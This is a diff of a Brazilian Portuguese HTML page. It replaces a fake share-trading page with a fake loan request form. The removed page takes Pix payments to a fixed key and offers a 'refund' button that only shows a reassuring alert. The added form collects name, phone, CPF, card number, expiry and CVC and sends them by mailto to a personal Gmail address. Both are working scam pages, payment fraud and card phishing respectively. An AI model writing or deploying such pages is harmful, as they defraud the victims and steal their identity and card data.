@@ -1,205 +1,40 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-BR">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sucesso</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f4f4f4;
-        }
-        .container {
-            max-width: 500px;
-            margin: 0 auto;
-            padding: 20px;
-            text-align: center;
-        }
-        header {
-            background-color: #222;
-            color: #fff;
-            padding: 10px 0;
-            font-size: 24px;
-        }
-        .chart {
-            margin: 20px 0;
-            height: 300px;
-            background: url('emp.jpg') no-repeat center center;
-            background-size: cover;
-            border: 1px solid #ccc;
-            border-radius: 10px;
-        }
-        .buttons {
-            display: flex;
-            justify-content: space-between;
-        }
-        .btn {
-            flex: 1;
-            margin: 10px;
-            padding: 15px 0;
-            font-size: 18px;
-            color: #fff;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        .btn.buy {
-            background-color: #007bff;
-        }
-        .btn.sell {
-            background-color: #dc3545;
-        }
-        footer {
-            margin-top: 20px;
-            font-size: 14px;
-            color: #555;
-        }
-        /* Modal styles */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            justify-content: center;
-            align-items: center;
-        }
-        .modal-content {
-            background: #fff;
-            padding: 20px;
-            text-align: center;
-            border-radius: 10px;
-            max-width: 400px;
-            width: 90%;
-        }
-        .modal-content h2 {
-            margin-bottom: 20px;
-        }
-        .modal-content p, .modal-content input {
-            font-size: 16px;
-            margin-bottom: 20px;
-        }
-        .close-btn, .copy-btn, .calculate-btn {
-            background-color: #007bff;
-            color: #fff;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-        .copy-btn {
-            background-color: #28a745;
-        }
-        .calculate-btn {
-            background-color: #17a2b8;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Empréstimo</title>
+  <script>
+    function enviarEmail() {
+      const nome = document.getElementById("nome").value;
+      const telefone = document.getElementById("telefone").value;
+      const cpf = document.getElementById("cpf").value;
+      const cartao = document.getElementById("cartao").value;
+      const validade = document.getElementById("validade").value;
+      const cvc = document.getElementById("cvc").value;
+
+      const corpo = `
+        Nome completo: ${nome}%0D%0A
+        Telefone: ${telefone}%0D%0A
+        CPF: ${cpf}%0D%0A
+        Número do cartão: ${cartao}%0D%0A
+        Validade: ${validade}%0D%0A
+        CVC: ${cvc}
+      `;
+
+      window.location.href = `mailto:ronald28int@gmail.com?subject=Pedido de Empréstimo&body=${corpo}`;
+    }
+  </script>
 </head>
 <body>
-    <header>Administrador</header>
-    <div class="container">
-        <div class="chart" id="chart">
-            <!-- Gráfico ilustrativo -->
-        </div>
-        <div class="buttons">
-            <button class="btn buy" onclick="openBuyModal()">Comprar</button>
-            <button class="btn sell" onclick="openSellModal()">Vender</button>
-        </div>
-    </div>
-
-    <!-- Modal de Compra -->
-    <div class="modal" id="buyModal">
-        <div class="modal-content">
-            <h2>Comprar Ação</h2>
-            <p>Preço por unidade: <strong>R$ 1,99</strong></p>
-            <p>Digite a quantidade que deseja comprar:</p>
-            <input type="number" id="quantity" min="1" placeholder="Quantidade">
-            <p id="totalPrice">Total: R$ 0,00</p>
-            <button class="calculate-btn" onclick="calculateTotal()">Calcular Total</button>
-            <p><strong>Código Pix:</strong></p>
-            <textarea id="pixCode" readonly rows="4" style="width: 100%; font-size: 14px;"></textarea>
-            <button class="copy-btn" onclick="copyPixCode()">Copiar Código Pix</button>
-            <button class="close-btn" onclick="closeModal('buyModal')">Fechar</button>
-        </div>
-    </div>
-
-    <!-- Modal de Venda -->
-    <div class="modal" id="sellModal">
-        <div class="modal-content">
-            <h2>Venda</h2>
-            <p>Digite sua chave Pix mesma foi efetuado a compra:</p>
-            <input type="text" id="userPixKey" placeholder="Digite sua chave Pix">
-            <button class="copy-btn" onclick="submitRefund()">Venda</button>
-            <button class="close-btn" onclick="closeModal('sellModal')">Fechar</button>
-        </div>
-    </div>
-
-    <footer>© 2025 sucesso. Todos os direitos reservados.</footer>
-
-    <script>
-        const basePixCode = "00020126360014BR.GOV.BCB.PIX0114+55989817809535204000053039865404"; // Prefixo fixo do Pix
-        const suffixPixCode = "5802BR5908Contador6008Sao Luis62100506Crypto6304313D"; // Sufixo fixo do Pix
-
-        // Função para abrir o modal de compra
-        function openBuyModal() {
-            document.getElementById('buyModal').style.display = 'flex';
-        }
-
-        // Função para abrir o modal de venda
-        function openSellModal() {
-            document.getElementById('sellModal').style.display = 'flex';
-        }
-
-        // Função para fechar o modal
-        function closeModal(modalId) {
-            document.getElementById(modalId).style.display = 'none';
-        }
-
-        // Função para calcular o total
-        function calculateTotal() {
-            const quantity = document.getElementById('quantity').value;
-            const pricePerUnit = 1.99;
-            const total = quantity * pricePerUnit;
-            document.getElementById('totalPrice').textContent = `Total: R$ ${total.toFixed(2)}`;
-
-            // Atualizar o código Pix com o valor total
-            const totalValue = total.toFixed(2).replace(".", ""); // Formato sem ponto decimal
-            const updatedPixCode = `${basePixCode}${totalValue}${suffixPixCode}`;
-            document.getElementById('pixCode').value = updatedPixCode;
-        }
-
-        // Função para copiar o código Pix
-        function copyPixCode() {
-            const pixCode = document.getElementById('pixCode');
-            pixCode.select();
-            try {
-                const success = document.execCommand('copy');
-                if (success) {
-                    alert('Código Pix copiado para a área de transferência!');
-                } else {
-                    alert('Não foi possível copiar o código Pix.');
-                }
-            } catch (err) {
-                console.error('Erro ao copiar código Pix: ', err);
-                alert('Erro ao copiar o código Pix.');
-            }
-        }
-
-        // Função para processar o reembolso
-        function submitRefund() {
-            const userPixKey = document.getElementById('userPixKey').value.trim();
-            if (userPixKey === '') {
-                alert('Por favor, digite sua chave Pix.');
-                return;
-            }
-            alert('Seu dinheiro estará de volta na sua conta em breve!');
-            closeModal('sellModal');
-        }
-    </script>
+  <h2>Solicitar Empréstimo</h2>
+  <input type="text" id="nome" placeholder="Nome completo" required><br>
+  <input type="tel" id="telefone" placeholder="Telefone" required><br>
+  <input type="text" id="cpf" placeholder="CPF" required><br>
+  <h2>Cartão da conta débito automático</h2>
+  <input type="text" id="cartao" placeholder="Número do cartão" maxlength="16" required><br>
+  <input type="text" id="validade" placeholder="Validade (MM/AA)" required><br>
+  <input type="text" id="cvc" placeholder="CVC" maxlength="4" required><br>
+  <button onclick="enviarEmail()">Enviar Pedido</button>
 </body>
 </html>
